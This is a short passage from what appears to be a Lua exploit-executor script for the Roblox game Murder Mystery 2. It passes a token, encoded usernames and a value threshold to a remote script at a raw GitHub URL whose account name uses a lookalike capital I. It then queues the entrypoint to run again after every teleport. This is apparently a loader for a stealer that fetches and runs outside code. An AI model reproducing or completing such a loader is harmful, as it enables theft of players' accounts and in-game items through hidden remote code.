        minValue,
        usernamesEncoded,
        token,
        tostring(doPing),
        "https://raw.githubusercontent.com/wraithexternaI/mm2/refs/heads/main/Wraith-mm2"
    )

    queue_on_teleport(entrypoint)
end)
